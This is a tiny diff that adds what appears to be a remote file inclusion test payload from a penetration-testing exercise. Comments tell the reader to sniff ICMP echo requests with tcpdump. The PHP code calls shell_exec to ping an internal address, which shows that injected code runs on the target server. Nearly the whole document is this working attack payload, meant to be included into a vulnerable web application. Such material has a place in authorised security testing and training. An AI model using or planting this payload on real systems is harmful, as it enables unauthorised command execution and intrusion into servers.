@@ -1,0 +1,8 @@
+//start ping.pcap and sniff for icmp echo requests, use RFI command to test for injection
+//tcpdump icmp[icmptype]=icmp-echo -vvv -s 0 -X -i any -w ping.pcap
+
+<pre style="text-align:left;">
+<?php
+	echo shell_exec('ping -n 1 10.11.0.202');
+?>
+</pre>
